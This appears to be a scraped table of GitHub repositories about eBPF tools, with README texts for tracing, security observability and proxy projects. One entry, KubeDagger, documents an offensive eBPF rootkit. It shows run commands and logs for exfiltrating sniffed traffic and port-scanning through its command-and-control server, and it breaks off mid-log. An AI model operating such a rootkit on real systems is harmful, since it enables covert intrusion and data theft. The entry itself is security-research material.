We have proposed a new WASI issue [wasi-bpf](https://github.com/WebAssembly/WASI/issues/513).

## Build the runtime

We have two types of runtime samples:

- A C/C++ runtime example, which is a minimal runtime based on WAMR. see [runtime/cpp](runtime/cpp) for more details.
- A Rust runtime example, which is a more complex runtime based on Wasmtime. see [runtime/wasm-bpf-rs](runtime/wasm-bpf-rs) for more details.

The runtime can be built as a library or a standalone executable. see [docs/build.md](docs/build.md) to build the runtimes.

### Use Nix

This project has nix flake and direnv support.
See:
- [direnv](https://github.com/direnv/direnv)
- [Nix](https://nixos.org/manual/nix/stable/command-ref/new-cli/nix.html)

## LICENSE

[MIT LICENSE](LICENSE)

## ðŸ”— Links

- eunomia-bpf project: simplify and enhance eBPF with CO-RE and WebAssembly https://github.com/eunomia-bpf/eunomia-bpf
- documents and blogs: https://docs.eunomia.dev
- CO-RE (Compile Once â€“ Run Everywhere): https://facebookmicrosites.github.io/bpf/blog/2020/02/19/bpf-portability-and-co-re.html
- WAMR (WebAssembly Micro Runtime): https://github.com/bytecodealliance/wasm-micro-runtime
- libbpf: https://github.com/libbpf/libbpf
"
eunomia-bpf/GPTtrace,254,22,254,4,Python,Generate eBPF programs and tracing with ChatGPT,2023-02-18T08:40:33Z,2025-09-29T08:15:49Z,61,"# GPTtrace ðŸ¤–

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Actions Status](https://github.com/eunomia-bpf/GPTtrace/workflows/Pylint/badge.svg)](https://github.com/eunomia-bpf/GPTtrace/actions)
[![DeepSource](https://deepsource.io/gh/eunomia-bpf/eunomia-bpf.svg/?label=active+issues&show_trend=true&token=rcSI3J1-gpwLIgZWtKZC-N6C)](https://deepsource.io/gh/eunomia-bpf/eunomia-bpf/?ref=repository-badge)
[![CodeFactor](https://www.codefactor.io/repository/github/eunomia-bpf/eunomia-bpf/badge)](https://www.codefactor.io/repository/github/eunomia-bpf/eunomia-bpf)
[![DOI](https://zenodo.org/badge/603351016.svg)](https://zenodo.org/badge/latestdoi/603351016)

An experiment for generating eBPF programs and tracing with GPT and natural language.

This experiment is not suitable for production use. For a better ways to use AI to generate eBPF programs or trace kernel, you can check [MCPtrace: A mcp server for eBPF tracing](https://github.com/eunomia-bpf/MCPtrace)

Want the online version? please see [GPTtrace-web](https://github.com/eunomia-bpf/GPTtrace-web) for **online demo**!

### **Checkout our paper [Kgent: Kernel Extensions Large Language Model Agent](https://dl.acm.org/doi/10.1145/3672197.3673434) in eBPF'24!**

## Key Features ðŸ’¡

### Interact and Tracing your Linux with natural language

example: tracing with Count page faults by process

<img src=""doc/trace.png"" alt=""Image"" width=""600"">

- start tracing with natural language
- let AI explain the result to you

### Generate eBPF programs with natural language

example: Write an eBPF program Print entered bash commands from all running shells, save the bpf program to a file and exit without actual run it.

<img src=""doc/generate.png"" alt=""Image"" width=""600"">

We use examples from [bpftrace tools](tools) to create vector store and search.

For more detail documents and tutorials about how to write eBPF programs, please refer to:  [`bpf-developer-tutorial`](https://github.com/eunomia-bpf/bpf-developer-tutorial) (a libbpf tool tutorial to teach ChatGPT to write eBPF programs)

### Choose the right bcc command line tool to complete the tracking task

Use the right bcc tools to trace the kernel

```console
$ python3 gpttrace ""Trace allocations and display each individual allocator function call""
 Run:  sudo memleak-bpfcc --trace 
Attaching to kernel allocators, Ctrl+C to quit.
(b'Relay(35)', 402, 6, b'd...1', 20299.252425, b'alloc exited, size = 4096, result = ffff8881009cc000')
(b'Relay(35)', 402, 6, b'd...1', 20299.252425, b'free entered, address = ffff8881009cc000, size = 4096')
(b'Relay(35)', 402, 6, b'd...1', 20299.252426, b'free entered, address = 588a6f, size = 4096')
(b'Relay(35)', 402, 6, b'd...1', 20299.252427, b'alloc entered, size = 4096')
(b'Relay(35)', 402, 6, b'd...1', 20299.252427, b'alloc exited, size = 4096, result = ffff8881009cc000')
(b'Relay(35)', 402, 6, b'd...1', 20299.252428, b'free entered, address = ffff8881009cc000, size = 4096')
(b'sudo', 6938, 10, b'd...1', 20299.252437, b'alloc entered, size = 2048')
(b'sudo', 6938, 10, b'd...1', 20299.252439, b'alloc exited, size = 2048, result = ffff88822e845800')
(b'node', 410, 18, b'd...1', 20299.252455, b'alloc entered, size = 256')
(b'node', 410, 18, b'd...1', 20299.252457, b'alloc exited, size = 256, result = ffff8882e9b66400')
(b'node', 410, 18, b'd...1', 20299.252458, b'alloc entered, size = 2048')
```

## How it works

![GPTtrace/doc/how-it-works.png](doc/how-it-works.png)

1. **User Input**: The user provides their operating system information and kernel version. This information is crucial as it helps to tailor the eBPF program to the specific environment of the user.
2. **Prompt Construction**: The user's input, along with the OS info and kernel version, is used to construct a prompt. This prompt is designed to guide the generation of the eBPF program.
3. **Vector Database Query**: The constructed prompt is used to query the Vector Database for eBPF program examples. These examples serve as a basis for generating the eBPF program that will be inserted into the kernel.
4. **Hook Point Identification**: The GPT API is used to identify potential hook points in the eBPF program. These hook points are locations in the code where the eBPF program can be inseted to monitor or modify the behavior of the kernel.
5. **eBPF Program Generation**: The identified hook points, along with the examples from the Vector Database, are used to generate the eBPF program. This program is designed to be inserted into the kernel to perform the desired tracing tasks.
6. **Kernel Insertion**: The generated eBPF program is inserted into the kernel. If there are any errors during this process, the tool will retry the steps from querying the Vector Database to kernel insertion a few times.
7. **Result Explanation**: Once the eBPF program is successfully inserted into the kernel, the AI will explain the result to the user. This includes an explanation of what the eBPF program is doing and how it is interacting with the kernel.

This process ensures that the eBPF program is tailored to the user's specific environment and needs, and that the user understands how the program works and what it is doing.

## Installation ðŸ”§

```sh
pip install gpttrace
```

## Usage and Setup ðŸ› 

```console
$ python3 -m gpttrace -h
usage: GPTtrace [-h] [-c CMD_NAME QUERY] [-v] [-k OPENAI_API_KEY]
                input_string

Use ChatGPT to write eBPF programs (bpftrace, etc.)

positional arguments:
  input_string          Your question or request for a bpf program

options:
  -h, --help            show this help message and exit
  -c CMD_NAME QUERY, --cmd CMD_NAME QUERY
                        Use the bcc tool to complete the trace task
  -v, --verbose         Show more details
  -k OPENAI_API_KEY, --key OPENAI_API_KEY
                        Openai api key, see
                        `https://platform.openai.com/docs/quickstart/add-
                        your-api-key` or passed through `OPENAI_API_KEY`
```

### First: login to ChatGPT

- Access https://platform.openai.com/docs/quickstart/add-your-api-keyï¼Œthen create your openai api key as following:

  ![image-20230402163041886](doc/api-key.png)

- Remember your key, and then set it to the environment variable `OPENAI_API_KEY` or use the `-k` option.

### start your tracing! ðŸš€

For example:

```sh
python3 gpttrace ""Count page faults by process""
```

If the eBPF program cannot be loaded into the kernel, The error message will be used to correct ChatGPT, and the result will be printed to the console.

## Examples

- Files opened by process
- Syscall count by program
- Read bytes by process:
- Read size distribution by process:
- Show per-second syscall rates:
- Trace disk size by process
- Count page faults by process
- Count LLC cache misses by process name and PID (uses PMCs):
- Profile user-level stacks at 99 Hertz, for PID 189:
- Files opened, for processes in the root cgroup-v2

## Citation

```bibtex
@inproceedings{10.1145/3672197.3673434,
author = {Zheng, Yusheng and Yang, Yiwei and Chen, Maolin and Quinn, Andrew},
title = {Kgent: Kernel Extensions Large Language Model Agent},
year = {2024},
isbn = {9798400707124},
publisher = {Association for Computing Machinery},
address = {New York, NY, USA},
url = {https://doi.org/10.1145/3672197.3673434},
doi = {10.1145/3672197.3673434},
abstract = {The extended Berkeley Packet Filters (eBPF) ecosystem allows for the extension of Linux and Windows kernels, but writing eBPF programs is challenging due to the required knowledge of OS internals and programming limitations enforced by the eBPF verifier. These limitations ensure that only expert kernel developers can extend their kernels, making it difficult for junior sys admins, patch makers, and DevOps personnel to maintain extensions. This paper presents Kgent, an alternative framework that alleviates the difficulty of writing an eBPF program by allowing Kernel Extensions to be written in Natural language. Kgent uses recent advances in large language models (LLMs) to synthesize an eBPF program given a user's English language prompt. To ensure that LLM's output is semantically equivalent to the user's prompt, Kgent employs a combination of LLM-empowered program comprehension, symbolic execution, and a series of feedback loops. Kgent's key novelty is the combination of these techniques. In particular, the system uses symbolic execution in a novel structure that allows it to combine the results of program synthesis and program comprehension and build on the recent success that LLMs have shown for each of these tasks individually.To evaluate Kgent, we develop a new corpus of natural language prompts for eBPF programs. We show that Kgent produces correct eBPF programs on 80\%---which is an improvement of a factor of 2.67 compared to GPT-4 program synthesis baseline. Moreover, we find that Kgent very rarely synthesizes ""false positive"" eBPF programs--- i.e., eBPF programs that Kgent verifies as correct but manual inspection reveals to be semantically incorrect for the input prompt. The code for Kgent is publicly accessible at https://github.com/eunomia-bpf/KEN.},
booktitle = {Proceedings of the ACM SIGCOMM 2024 Workshop on EBPF and Kernel Extensions},
pages = {30â€“36},
numpages = {7},
keywords = {Large Language Model, Symbolic Execution, eBPF},
location = {Sydney, NSW, Australia},
series = {eBPF '24}
}
```

## LICENSE

MIT

## ðŸ”— Links

- detail documents and tutorials about how we train ChatGPT to write eBPF programs: https://github.com/eunomia-bpf/bpf-developer-tutorial ï¼ˆåŸºäºŽ CO-RE (ä¸€æ¬¡ç¼–å†™ï¼Œåˆ°å¤„è¿è¡Œï¼‰ libbpf çš„ eBPF å¼€å‘è€…æ•™ç¨‹ï¼šé€šè¿‡ 20 ä¸ªå°å·¥å…·ä¸€æ­¥æ­¥å­¦ä¹  eBPFï¼ˆå°è¯•æ•™ä¼š ChatGPT ç¼–å†™ eBPF ç¨‹åºï¼‰
- bpftrace: https://github.com/iovisor/bpftrace
- ChatGPT: https://chat.openai.com/
"
cilium/tetragon,4203,465,4203,202,C,eBPF-based Security Observability and Runtime Enforcement,2022-03-23T10:25:36Z,2025-10-12T12:03:22Z,5393,"<a href=""https://tetragon.io"">
  <picture>
    <source media=""(prefers-color-scheme: light)"" srcset=""docs/assets/icons/logo.svg"" width=""400"">
    <img src=""docs/assets/icons/logo-dark.svg"" width=""400"">
  </picture>
</a>

[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
[![License](https://img.shields.io/badge/license-BSD-blue.svg)](https://opensource.org/license/bsd-2-clause/)
[![License](https://img.shields.io/badge/license-GPL-blue.svg)](https://opensource.org/license/gpl-2-0/)

---

Ciliumâ€™s new [Tetragon](https://tetragon.io) component enables powerful
real-time, eBPF-based Security Observability and Runtime Enforcement.

Tetragon detects and is able to react to security-significant events, such as

- Process execution events
- System call activity
- I/O activity including network & file access

When used in a Kubernetes environment, Tetragon is Kubernetes-aware - that is,
it understands Kubernetes identities such as namespaces, pods and so on - so
that security event detection can be configured in relation to individual
workloads.

[![Tetragon Overview Diagram](https://github.com/cilium/tetragon/blob/main/docs/static/images/smart_observability.png)](https://tetragon.io/docs/overview/)

See more about [how Tetragon is using eBPF](https://tetragon.io/docs/overview#functionality-overview).

## Getting started

Refer to the [official documentation of Tetragon](https://tetragon.io/docs/).

To get started with Tetragon, take a look at the [getting started
guides](https://tetragon.io/docs/getting-started/) to:
- [Try Tetragon on Kubernetes](https://tetragon.io/docs/getting-started/install-k8s/)
- [Try Tetragon on Linux](https://tetragon.io/docs/getting-started/install-docker/)
- [Deploy Tetragon](https://tetragon.io/docs/installation/)
- [Install the Tetra CLI](https://tetragon.io/docs/installation/tetra-cli/)

Tetragon is able to observe critical hooks in the kernel through its sensors
and generates events enriched with Linux and Kubernetes metadata:
1. **Process lifecycle**: generating `process_exec` and `process_exit` events
   by default, enabling full process lifecycle observability. Learn more about
   these events on the [process lifecycle use case page](https://tetragon.io/docs/use-cases/process-lifecycle/).
1. **Generic tracing**: generating `process_kprobe`, `process_tracepoint` and
   `process_uprobe` events for more advanced and custom use cases. Learn more
   about these events on the [TracingPolicy concept page](https://tetragon.io/docs/concepts/tracing-policy/)
   and discover [multiple use cases](https://tetragon.io/docs/use-cases/) like:
   - [ðŸŒ network observability](https://tetragon.io/docs/use-cases/network-observability/)
   - [ðŸ“‚ filename access](https://tetragon.io/docs/use-cases/filename-access/)
   - [ðŸ”‘ credentials monitoring](https://tetragon.io/docs/use-cases/linux-process-credentials/)
   - [ðŸ”“ privileged execution](https://tetragon.io/docs/use-cases/process-lifecycle/privileged-execution/)

See further resources:
- [Conference Talks, Books, Blog Posts, and Labs](https://tetragon.io/docs/resources/)
- [Frequently Asked Question](https://tetragon.io/docs/installation/faq/)
- [References](https://tetragon.io/docs/reference/)

## Join the community

Join the Tetragon [ðŸ’¬ Slack channel](https://slack.cilium.io) and the
[ðŸ“… Community Call](https://isogo.to/tetragon-meeting-notes) to chat with
developers, maintainers, and other users. This is a good first stop to ask
questions and share your experiences.

## How to Contribute

For getting started with local development, you can refer to the
[Contribution Guide](https://tetragon.io/docs/contribution-guide/). If
you plan to submit a PR, please [""sign-off""](https://tetragon.io/docs/contribution-guide/developer-certificate-of-origin/)
your commits.
"
v2rayA/dae,4639,288,4639,109,Go,eBPF-based Linux high-performance transparent proxy solution.,2023-01-23T11:53:16Z,2025-10-12T13:58:43Z,825,"# dae

<img src=""https://github.com/daeuniverse/dae/blob/main/logo.png"" border=""0"" width=""25%"">

<p align=""left"">
    <img src=""https://github.com/daeuniverse/dae/actions/workflows/build.yml/badge.svg"" alt=""Build""/>
    <img src=""https://custom-icon-badges.herokuapp.com/github/license/daeuniverse/dae?logo=law&color=orange"" alt=""License""/>
    <img src=""https://custom-icon-badges.herokuapp.com/github/v/release/daeuniverse/dae?logo=rocket"" alt=""version"">
    <img src=""https://custom-icon-badges.herokuapp.com/github/issues-pr-closed/daeuniverse/dae?color=purple&logo=git-pull-request&logoColor=white""/>
    <img src=""https://custom-icon-badges.herokuapp.com/github/last-commit/daeuniverse/dae?logo=history&logoColor=white"" alt=""lastcommit""/>
</p>

**_dae_**, means goose, is a high-performance transparent proxy solution.

To enhance traffic split performance as much as possible, dae employs the transparent proxy and traffic split suite within the Linux kernel using eBPF. As a result, dae can enable direct traffic to bypass the proxy application's forwarding, facilitating genuine direct traffic passage. Through this remarkable feat, there is minimal performance loss and negligible additional resource consumption for direct traffic.

As a successor of [v2rayA](https://github.com/v2rayA/v2rayA), dae abandoned v2ray-core to meet the needs of users more freely.

## Features

- [x] Implement `Real Direct` traffic split (need ipforward on) to achieve [high performance](https://docs.google.com/spreadsheets/d/1UaWU6nNho7edBNjNqC8dfGXLlW0-cm84MM7sH6Gp7UE/edit?usp=sharing).
- [x] Support to split traffic by process name in local host.
- [x] Support to split traffic by MAC address in LAN.
- [x] Support to split traffic with invert match rules.
- [x] Support to automatically switch nodes according to policy. That is to say, support to automatically test independent TCP/UDP/IPv4/IPv6 latencies, and then use the best nodes for corresponding traffic according to user-defined policy.
- [x] Support advanced DNS resolution process.
- [x] Support full-cone NAT for shadowsocks, trojan(-go) and socks5 (no test).
- [x] Support various trending proxy protocols, seen in [proxy-protocols.md](./docs/en/proxy-protocols.md).

## Getting Started

Please refer to [Quick Start Guide](./docs/en/README.md) to start using `dae` right away!

## Notes

1. If you setup dae and also a shadowsocks server (or any UDP servers) on the same machine in public network, such as a VPS, don't forget to add `l4proto(udp) && sport(your server ports) -> must_direct` rule for your UDP server port. Because states of UDP are hard to maintain, all outgoing UDP packets will potentially be proxied (depends on your routing), including traffic to your client. This behaviour is not what we want to see. `must_direct` makes all traffic from this port including DNS traffic direct.
1. If users in mainland China find that the first screen time is very long when they visit some domestic websites for the first time, please check whether you use foreign DNS to handle some domestic domain in DNS routing. Sometimes this is hard to spot. For example, `ocsp.digicert.cn` is included in `geosite:geolocation-!cn` unexpectedly, which will cause some tls handshakes to take a long time. Be careful to use such domain sets in DNS routing.

## How it works

See [How it works](./docs/en/how-it-works.md).

## TODO

- [ ] Automatically check dns upstream and source loop (whether upstream is also a client of us) and remind the user to add sip rule.
- [ ] MACv2 extension extraction.
- [ ] Log to userspace.
- [ ] Protocol-oriented node features detecting (or filter), such as full-cone (especially VMess and VLESS).
- [ ] Add quick-start guide
- [ ] ...

## Contributors

Special thanks goes to all [contributors](https://github.com/daeuniverse/dae/graphs/contributors). If you would like to contribute, please see the [instructions](./docs/en/development/contribute.md). Also, it is recommended following the [commit-msg-guide](./docs/en/development/commit-msg-guide.md).

## License

[AGPL-3.0 (C) daeuniverse](https://github.com/daeuniverse/dae/blob/main/LICENSE)

## Stargazers over time

[![Stargazers over time](https://starchart.cc/daeuniverse/dae.svg)](https://starchart.cc/daeuniverse/dae)
"
yasindce1998/KubeDagger,39,2,39,1,C,Kubernetes offensive framework built in eBPF,2021-12-10T12:25:00Z,2025-09-30T11:06:08Z,39,"# KubeDagger

<p align=""center"">
  <img src=""https://github.com/yasindce1998/KubeDagger/blob/master/logo/logo-removebg-preview.png?raw=true"" alt=""Kube Dagger""/>
</p>

[![License: GPL v2](https://img.shields.io/badge/License-GPL%20v2-blue.svg)](https://www.gnu.org/licenses/old-licenses/gpl-2.0.en.html)
[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)

`KubeDagger` will act as a rootkit that leverages multiple eBPF features to implement offensive security techniques. We implemented most of the features you would expect from a rootkit: obfuscation techniques, container breakouts, persistent access, command and control, pivoting, network scanning, Runtime Application Self-Protection (RASP) bypass, etc.

This is inspired by the rootkit was presented at [BlackHat USA 2021: With Friends Like eBPF, Who Needs Enemies?](https://www.blackhat.com/us-21/briefings/schedule/#with-friends-like-ebpf-who-needs-enemies-23619) and [Defcon 29: eBPF, I thought we were friends !](https://defcon.org/html/defcon-29/dc-29-speakers.html#fournier).  Check out to see a demo of the network scanner, container breakouts and the RASP bypass.

Credits: [ebpfkit](https://github.com/Gui774ume/ebpfkit) \
Video:  [BlackHat USA 2021: With Friends Like eBPF, Who Needs Enemies?](https://www.youtube.com/watch?v=Q8eY67hDvkc)

## **Disclaimer**
 The application herein is provided for educational purposes only and for those who are willing and curious to learn about ethical hacking, security and penetration testing with eBPF.

**Do not attempt to use these tools to violate the law. The author is not responsible for any illegal action. Misuse of the provided information can result in criminal charges.**

## System requirements

- golang 1.13+
- This project was developed on an Ubuntu Focal machine (Linux Kernel 5.4)
- Kernel headers are expected to be installed in `lib/modules/$(uname -r)` (see `Makefile`)
- clang & llvm (11.0.1)
- [Graphviz](https://graphviz.org/) (to generate graphs)
- [go-bindata](https://github.com/shuLhan/go-bindata) (`go get -u github.com/shuLhan/go-bindata/...`)

## Build

1) To build the entire project, run:

```shell script
# ~ make
```

2) To install `kubedagger-client` (copies `kubedagger-client` to `/usr/bin/`), run:
```shell script
# ~ make install_client
```

## Getting started

`KubeDagger` contains the entire rootkit. It needs to run as root. Run `sudo ./bin/kubedagger -h` to get help. You can simply run `sudo ./bin/kubedagger` to start the rootkit with default parameters.

```shell script
# ~ sudo ./bin/kubedagger -h
Usage:
  kubedagger [flags]

Flags:
      --append                        (file override feature only) when set, the content of the source file will be appended to the content of the target file
      --comm string                   (file override feature only) comm of the process for which the file override should apply
      --disable-bpf-obfuscation       when set, kubedagger will not hide itself from the bpf syscall
      --disable-network-probes        when set, kubedagger will not try to load its network related probes
      --docker string                 path to the Docker daemon executable (default ""/usr/bin/dockerd"")
  -e, --egress string                 egress interface name (default ""enp0s3"")
  -h, --help                          help for kubedagger
  -i, --ingress string                ingress interface name (default ""enp0s3"")
  -l, --log-level string              log level, options: panic, fatal, error, warn, info, debug or trace (default ""info"")
      --postgres string               path to the Postgres daemon executable (default ""/usr/lib/postgresql/12/bin/postgres"")
      --src string                    (file override feature only) source file which content will be used to override the content of the target file
      --target string                 (file override feature only) target file to override
  -p, --target-http-server-port int   Target HTTP server port used for Command and Control (default 8000)
      --webapp-rasp string            path to the webapp on which the RASP is installed
# ~ sudo ./bin/kubedagger
```

In order to use the client, you'll need to have an HTTP server to enable the Command and Control feature of the rootkit. We provide a simple webapp that you can start by running `./bin/webapp`. Run `./bin/webapp -h` to get help.

```shell script
# ~ ./bin/webapp -h
Usage of ./bin/webapp:
  -ip string
    	ip on which to bind (default ""0.0.0.0"")
  -port int
    	port to use for the HTTP server (default 8000)
# ~ ./bin/webapp
```

Once both `kubedagger` and the `webapp` are running, you can start using `kubedagger-client`. Run `kubedagger-client -h` to get help.

```shell script
# ~ kubedagger-client -h
Usage:
  kubedagger-client [command]

Available Commands:
  docker            Docker image override configuration
  fs_watch          file system watches
  help              Help about any command
  network_discovery network discovery configuration
  pipe_prog         piped programs configuration
  postgres          postgresql authentication control

Flags:
  -h, --help               help for kubedagger-client
  -l, --log-level string   log level, options: panic, fatal, error, warn, info, debug or trace (default ""info"")
  -t, --target string      target application URL (default ""http://localhost:8000"")

Use ""kubedagger-client [command] --help"" for more information about a command.
```

## Examples

This section contains only 3 examples. We invite you to watch our BlackHat USA 2021 and Defcon 29 talks to see a demo of all the features of the rootkit. For example, you'll see how you can use Command and Control to change the passwords of a Postgresql database at runtime, or how we successfully hid the rootkit on the host.
We also demonstrate 2 container breakouts during our [BlackHat talk](https://www.blackhat.com/us-21/briefings/schedule/#with-friends-like-ebpf-who-needs-enemies-23619), and a RASP bypass during our [Defcon talk](https://defcon.org/html/defcon-29/dc-29-speakers.html#fournier).

### Exfiltrate passive network sniffing data

On startup, by default, the rookit will start listening passively for all the network connections made to and from the infected host. You can periodically poll that data using the `network_discovery` command of `kubedagger-client`. It may take a while to extract everything so be patient ...

```shell script
# ~ kubedagger-client -l debug network_discovery get
DEBUG[2021-08-04T10:10:46Z]
GET /get_net_dis HTTP/1.1
Host: localhost:8000
User-Agent: 0000________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________

DEBUG[2021-08-04T10:10:46Z]
GET /get_fswatch HTTP/1.1
Host: localhost:8000
User-Agent: 0/kubedagger/network_discovery#________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________

DEBUG[2021-08-04T10:10:46Z]
GET /get_net_dis HTTP/1.1
Host: localhost:8000
User-Agent: 0015________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________

[...]

INFO[2021-08-04T10:10:57Z] Dumping collected network flows (358):
10.0.2.2:52615 -> 10.0.2.15:8000 (1) UDP 0B TCP 2461B
10.0.2.15:8000 -> 10.0.2.2:52615 (2) UDP 0B TCP 833B
10.0.2.15:0 -> 10.0.2.3:0 (3) UDP 0B TCP 0B
10.0.2.3:0 -> 10.0.2.15:0 (4) UDP 0B TCP 0B
10.0.2.15:22 -> 10.0.2.2:51653 (2) UDP 0B TCP 17120B
10.0.2.2:51653 -> 10.0.2.15:22 (1) UDP 0B TCP 13068B
10.0.2.15:48308 -> 3.233.147.212:443 (2) UDP 0B TCP 532255B

[...]

51.15.175.180:123 -> 10.0.2.15:36389 (1) UDP 76B TCP 0B
10.0.2.15:38116 -> 169.254.172.1:51678 (2) UDP 0B TCP 60B
10.0.2.15:38120 -> 169.254.172.1:51678 (2) UDP 0B TCP 60B
127.0.0.1:41900 -> 127.0.0.1:8000 (2) UDP 0B TCP 53525B
127.0.0.1:41900 -> 127.0.0.1:8000 (1) UDP 0B TCP 53525B
127.0.0.1:8000 -> 127.0.0.1:41900 (2) UDP 0B TCP 38518B
127.0.0.1:8000 -> 127.0.0.1:41900 (1) UDP 0B TCP 38518B
INFO[2021-08-04T10:10:58Z] Graph generated: /tmp/network-discovery-graph-453667534
```

The final step is to generate the *svg* file. We used the `fdp` layout of [Graphviz](https://graphviz.org/).

```shell script
# ~ fdp -Tsvg /tmp/network-discovery-graph-453667534 > ./graphs/passive_network_discovery.svg
```

![passive_network_discovery.svg](graphs/passive_network_discovery.svg)

### Run a port scan on 10.0.2.3, from port 7990 to 8010

> Note: for this feature to work, you cannot run `kubedagger-client` locally. If you're running the rootkit in a guest VM, expose the webapp port (default 8000) of the guest VM to the host and make the `kubedagger-client` request from the host.

To request a port scan, use the `network_discovery` command. You can specify the target IP, start port and port range.

```shell script
# ~ kubedagger-client -l debug network_discovery scan --ip 10.0.2.3 --port 7990 --range 20
DEBUG[2021-08-04T11:59:46Z]
GET /get_net_sca HTTP/1.1
Host: localhost:8000
User-Agent: 0100000020030799000020______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________

DEBUG[2021-08-04T11:59:51Z] {""api"":{""version"":""1.0.1"",""hash"":""9b71d224bd62f3785d96d46ad3ea3d73319bfbc2890caadae2dff72519673ca72323c3d99ba5c11d7cfc1d215a922ad186ac28b0aaa23ed6ebe436e67aacd987cc6e14b8c5da0c4663475c2e5c3adef46f73bcdec043"",""git_commit"":""c1d215a922ad186acbe436e6e2c513128b0aaa23ed6e3a4d48140b4931895384bc5b8074b7ef6b1a3e2a65b5be0c875871fec6e1a38f9c3de2c51313a4d48140b4931895384bc5b8074b7ef6b35c208abd4e16f2"",""release_date"":""2021-03-29T13:51:31.606184183Z""},""timestamp"":""2021-08-04T09:59:51.680566768Z"",""status"":200,""data"":""OK""}
```

On the infected host, you should see debug logs in `/sys/kernel/debug/tracing/trace_pipe`. For example, you should see the initial ARP request to resolve the MAC address of the target IP, and then a list of SYN requests to probe the ports from the requested range.

```shell script 
# ~ sudo cat /sys/kernel/debug/tracing/trace_pipe
          <idle>-0       [003] ..s.  5557.564353: 0: sending ARP request ...
          <idle>-0       [003] ..s.  5557.564451: 0: ARP response!
            sshd-3035    [003] ..s1  5559.108243: 0: SYN request answer (7990): rst:1 syn:0
            sshd-3035    [003] ..s.  5559.108482: 0: SYN request answer (7991): rst:1 syn:0
          <idle>-0       [003] ..s.  5559.108666: 0: SYN request answer (7992): rst:1 syn:0
            sshd-3035    [003] ..s.  5559.108882: 0: SYN request answer (7993): rst:1 syn:0
            sshd-3035    [003] ..s1  5559.109075: 0: SYN request answer (7994): rst:1 syn:0
            sshd-3035    [003] ..s1  5559.109304: 0: SYN request answer (7995): rst:1 syn:0
          <idle>-0       [003] .Ns.  5559.109568: 0: SYN request answer (7996): rst:1 syn:0
          <idle>-0       [003] ..s.  5559.109896: 0: SYN request answer (7997): rst:1 syn:0
     ksoftirqd/3-30      [003] ..s.  5559.110065: 0: SYN request answer (7998): rst:1 syn:0
            sshd-3035    [003] ..s.  5559.110344: 0: SYN request answer (7999): rst:1 syn:0
          <idle>-0       [003] ..s.  5559.110629: 0: OPEN PORT 8000
          <idle>-0       [003] ..s.  5559.110639: 0: SYN request answer (8000): rst:0 syn:1
          <idle>-0       [003] .Ns.  5559.110840: 0: SYN request answer (8001): rst:1 syn:0
            sshd-3035    [003] ..s.  5559.111100: 0: SYN request answer (8002): rst:1 syn:0
            sshd-3035    [003] ..s1  5559.111455: 0: SYN request answer (8003): rst:1 syn:0
            sshd-3035    [003] ..s1  5559.111661: 0: SYN request answer (8004): rst:1 syn:0
          <idle>-0       [003] .ns.  5559.111852: 0: SYN request answer (8005): rst:1 syn:0
          <idle>-0       [003] ..s.  5559.112016: 0: SYN request answer (8006): rst:1 syn:0
          <idle>-0       [003] ..s.  5559.112245: 0: SYN request answer (8007): rst:1 syn:0
          <idle>-0       [003] ..s.  5559.112597: 0: SYN request answer (8008): rst:1 syn:0
          <idle>-0       [003] ..s.  5559.112913: 0: SYN request answer (8009): rst:1 syn:0
            sshd-3035    [003] ..s.  5559.122702: 0: scan done !
```

Once the scan is finished, you can exfiltrate the scan result using the `network_discovery` command. You need to add the `active` flag to request the network traffic generated by the network scan. It may take a while to extract everything so be patient ...

```shell script
# ~ kubedagger-client -l debug network_discovery get --active
DEBUG[2021-08-04T09:49:15Z]
GET /get_net_dis HTTP/1.1
Host: localhost:8000
User-Agent: 0000________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________

DEBUG[2021-08-04T09:49:15Z]
GET /get_fswatch HTTP/1.1
Host: localhost:8000
User-Agent: 0/kubedagger/network_discovery#___________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________"
xinity/k0s_cilium_playground,21,2,21,0,Shell,A full bash based k0s Cilium Clustermesh enabled playground,2023-02-23T17:56:53Z,2025-06-16T13:38:27Z,6,"# WORK IN PROGRESS 
# contributions highly appreciated  ;)

## K0S Cilium Playground

### Intro
This repository holds set of scripts that helps building and configuring a full cilium playground with :
- cluster-mesh enabled
- metallb as an IPAM solution 

This toolkit has been tested on MACOS but should behave the exact same way on Linux hosts.
### Requirements
For this project to run successfully you will need the following binaries deployment on your host:
- multipass
- k0sctl
- brew 
- kubectl 
- helm

Note: on MACOS/Linux you just need `brew` installed, the scripts will install the rest of the needed requirements.

### Variables
Several variables as been declared in the `playground_vars.sh`  script, some of them can be overridden:

| name | description | type | default value | comment |
|------|-------------|------|---------------|---------|
|DEBUGENABLED| Enables Debug Mode i.e: k0s controller visible and debug log enabled|Boolean|true| If you don't need to see the controller(s) nor the full logs, pass the variable to 'false'|
|K0SCTLVERS|Version of the k0sctl binary|string|v0.14.0|if the binary doesn't exist AND brew installed, it will automatically deploy the latest version [UNUSED FOR NOW]|
|METALLBVERS|Version of metallb used|string|v0.13.7|         |
|CILIUMENABLED|Enable or not the Cilium CNI AND clustermesh configuration|Boolean|true|if cilium is not deployed i.e:CILIUMENABLED=false <br> the default CNI will be used <br>(as of now kube-router)       |
|CILIUMVERS|Version of cilium used|number|1.12.4|Cilium version <1.13 **NEEDS** metallb , the 1.13 is yet to be tested|
|CUSTOMCILIUM|Enables usage of a custom Cilium helm charts configuration|Boolean|false|if set to `true` <br>the CUSTOMCILIUMVALUESFILES should be filled with the values.yaml content to be used with cilium|
|CUSTOMCILIUMVALUESFILES|Values to be passed to the cilium helm charts|string|[empty]|values to be passed in yaml format|
|NUMBER_OF_VMS|number of VMs for each cluster|number|3| the number of VMs counts both controllers and workers nodes|
|SSHPKEYPATH|path to access the ssh key file |string|~/.ssh/|      |
